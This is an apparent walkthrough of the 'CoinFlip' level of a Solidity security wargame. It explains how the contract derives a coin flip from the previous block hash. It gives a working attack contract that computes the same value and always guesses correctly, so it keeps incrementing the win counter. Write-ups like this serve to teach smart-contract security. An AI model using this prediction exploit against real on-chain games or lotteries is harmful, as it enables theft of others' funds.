# COINFLIP

## In this level we'll be able to know the importance of blockvalue and how its uage can be miused or manipulated

### Let us go through the contract first

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

## The CoinFlip contract has a simple coin-flipping mechanism:

## State Variables:

### consecutiveWins:

 Tracks the number of consecutive wins.

### lastHash: 

Stores the hash of the last block to prevent replays.

### FACTOR: 

A large constant used to determine the outcome of the coin flip.

### Constructor:

Initializes consecutiveWins to 0.

### flip Function:

---> Takes a boolean guess (true or false) about the outcome of the coin flip.

---> Retrieves the hash of the most recent block and converts it to a uint256.

---> Uses lastHash to prevent replay attacks (i.e., making sure the function isn't called with the same block hash more than once).

---> Computes the coin flip outcome by dividing the block hash by the FACTOR.

---> Determines if the computed side matches the guess.

---> Updates consecutiveWins if the guess was correct; otherwise, it resets the count.

## THE EXPLOIT

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
 
contract CoinFlipAttack {

        CoinFlip flip = CoinFlip(0xFede5F8da39e1Ad890376f8760A43b7401304F35);
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flipattack() public{
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        flip.flip(side);
    }}

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

---> In the above attack contract we have included the actual coinflip contract and that we have included an instance of the same in our attack contract.

---> The attack contract simply makes use of the blockvalue.

## THE KEY 

### Block Hash Predictability:

The block hash used in the CoinFlip contract is predictable within the same block. This means that the CoinFlipAttack contract can predict the result of the coin flip by reading the block hash and performing the same computation as the CoinFlip contract.
Since the block hash is publicly available and deterministic, the attacker can simulate the coin flip outcome in their attack contract.

---> We can then call the flipattack function, which reads the block hash, computes the coin flip result, and then calls the flip function on the CoinFlip contract with the predicted result.

---> This allows us to always win the coin flip, incrementing the consecutiveWins counter in the CoinFlip contract.

## HEHE SO BEWARE WHILE USING BLOCKVALUE

## THANK YOU !!!
